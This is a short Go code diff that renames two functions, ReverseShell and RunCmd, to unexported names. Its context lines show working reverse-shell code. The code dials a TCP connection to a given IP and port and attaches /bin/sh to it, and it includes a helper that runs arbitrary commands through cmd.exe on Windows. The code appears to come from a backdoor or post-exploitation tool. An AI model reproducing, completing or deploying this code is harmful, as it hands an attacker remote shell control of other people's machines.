@@ -11,7 +11,7 @@ import (
     "flag"
 )
 
-func ReverseShell(ip string, port string) {
+func reverseShell(ip string, port string) {
     c, _ := net.Dial("tcp", ip + ":" + port)
     cmd := exec.Command("/bin/sh")
     cmd.Stdin=c
@@ -22,7 +22,7 @@ func ReverseShell(ip string, port string) {
 
 
 
-func RunCmd(cmd string) string {
+func runCmd(cmd string) string {
     if runtime.GOOS == "windows" {
         sh := "cmd.exe"
         out, err := exec.Command(sh,"/K", cmd).Output()
